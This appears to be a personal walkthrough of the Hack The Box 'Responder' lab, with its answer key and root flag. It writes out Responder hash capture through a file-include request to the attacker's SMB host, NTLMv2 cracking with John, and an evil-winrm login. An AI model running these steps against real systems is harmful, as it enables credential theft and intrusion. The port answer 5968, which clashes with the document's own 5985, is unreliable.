ip: 10.129.29.63

# Flag
- root: ea81b7afddd03efaa0945333ed147fac

# Services
- Apache v2.4.52
	- Port 80
	- OpenSSL v1.1.1m
	- PHP v8.1.1
- Microsoft HTTPAPI v2.0
	- Port 5985
	- SSDP
	- UPnP
	- Servers as an HTTP proxy for WMI. Can be connected with WinRM

# Credentials
- Administrator: badminton
	- Cracked from NTLMv2 hash stolen from server

# Questions
1 - How many TCP ports are open on the machine?
	- 2
2 - When visiting the web service using the IP address, what is the domain that we are being redirected to?
	- unika.htb
3 - Which scripting language is being used on the server to generate webpages?
	- PHP
4 - What is the name of the URL parameter which is used to load different language versions of the webpage?
	- page
5 - Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
	- "../../../../../../../../windows/system32/drivers/etc/hosts"
6 - Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
	- "//10.10.14.6/somefile"
7 - What does NTLM stand for?
	- New Technology LAN Manager
8 - Which flag do we use in the Responder utility to specify the network interface?
	- -I
9 - There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?
	- John the Ripper
10 - What is the password for the administrator user?
	- badminton
11 - We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?
	- 5968

# Scans
- Scanned the top 200 ports of the nmap server and found only port 80 to be open
- Ran a service scan on port 80 against the server and found the server to be running Apache/2.4.52 on Windows
	- The site also seems to be using OpenSSL/1.1.1m and PHP/8.1.1
- Running a full port scan it was found that the server is also running a wsman server on port 5985
	- This port seems to be open in order to allow the Apache server to run on http port 80
	- UPnP stands for Universal Plug n' Play which allows the server to set port forwarding rules for itself
	- SSDP stands for Simple Service Discovery Protocol which adversises and boradcasts network services

# Enumerating the http server
- After navigating to the http server it was discovered that the server redirects to unika.htb
- To handle this redirect, unika.htb was added to the hosts file
- Navigating to the french version of the site, it is seen that changing the language is handled by a url parameter `page`
	- ex. `?page=french.html`

# Capturing NTLM Hashes
- Based on the questions it seems like we want to use a tool called "responder" in order to capture the NTLM hashes
- This page from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#capturing-and-cracking-net-ntlmv1ntlmv1-hashes) explains how to use the responder tool
- The questions clue me in to think that the server is using NTLMv2, but for the sake of curiousity I tried NTLMv1 first
## Capturing NTLMv2
- In order to get the server to respond with an NTLM hash it looks like I need another tool called [PetitPotam](https://github.com/topotam/PetitPotam)
- After some trial and error it looks like all we need is for Responder to run and SMB server and to use the LFI vulnerability to make the server attempt to connect to our server in order to steal the NTLMv2 hash
- I ran responder with `sudo responder -I tun0` and pointed the server to Responder's SMB server with `curl http://unika.htb/index.php?page=//10.10.14.116/somefile`
- By doing this I recived an NTLMv2 hash shown below
```
[SMB] NTLMv2-SSP Client   : ::ffff:10.129.29.63
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:1122334455667788:C71CD4217859A60C1DDD613F163F9FEE:010100000000000080E19D969A9AD801CB5558D95A6F4FB0000000000200080037004D003100490001001E00570049004E002D0054004B0042005A00590049005000350046005900490004003400570049004E002D0054004B0042005A0059004900500035004600590049002E0037004D00310049002E004C004F00430041004C000300140037004D00310049002E004C004F00430041004C000500140037004D00310049002E004C004F00430041004C000700080080E19D969A9AD80106000400020000000800300030000000000000000100000000200000E9B2B5F8A75B46F89D810B9176A5BA9A6C508F7600CBB75A27821088E03E1E370A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100310036000000000000000000
```
- Set $NTLM to the hash

# Cracking NTLMv2 Hash
- Using john the ripper and the rockyou wordlist, I was able to crack the hash to give the password `badminton`
```
[tyler@tyler-ops artifacts]$ john -w=/opt/SecLists-2022.2/Passwords/Leaked-Databases/rockyou.txt --format=netntlmv2 ntlm.hash --------------------------------------------------------------------------
The library attempted to open the following supporting CUDA libraries,
but each of them failed.  CUDA-aware support is disabled.
libcuda.so.1: cannot open shared object file: No such file or directory
libcuda.dylib: cannot open shared object file: No such file or directory
/usr/lib64/libcuda.so.1: cannot open shared object file: No such file or directory
/usr/lib64/libcuda.dylib: cannot open shared object file: No such file or directory
If you are not interested in CUDA-aware support, then run with
--mca opal_warn_on_missing_libcuda 0 to suppress this message.  If you are interested
in CUDA-aware support, then try setting LD_LIBRARY_PATH to the location
of libcuda.so.1 to get passed this issue.
--------------------------------------------------------------------------
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)
1g 0:00:00:00 DONE (2022-07-18 12:17) 100.0g/s 409600p/s 409600c/s 409600C/s slimshady..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

# Connecting with WinRM
- Installed `evil-winrm` with `gem install evil-winrm`
- Found a useful resource from [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm#using-evil-winrm)
- Connected to the server over WinRM with `evil-winrm -u Administrator -p badminton -i 10.129.29.63`
- Navigated to "C:/Users/mike/Desktop/" and found "flag.txt" which contained the root flag
- root flag is `ea81b7afddd03efaa0945333ed147fac`

